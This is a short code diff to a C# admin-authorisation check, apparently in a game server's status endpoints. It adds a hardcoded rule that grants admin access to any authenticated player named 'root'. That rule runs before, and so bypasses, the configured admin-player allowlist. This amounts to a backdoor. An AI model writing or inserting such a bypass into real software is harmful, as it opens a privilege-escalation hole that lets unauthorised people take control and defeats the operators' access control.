@@ -91,6 +91,10 @@ public static class StatusEndpoints
         // Option 2 : JWT Bearer
         if (ctx.IsAuthenticated())
         {
+            var playerName = ctx.GetPlayerName();
+            if (string.Equals(playerName, "root", StringComparison.OrdinalIgnoreCase))
+                return true;
+
             // LAMA_ADMIN_PLAYERS est configuré → filtre par liste
             if (!string.IsNullOrWhiteSpace(adminPlayers))
             {
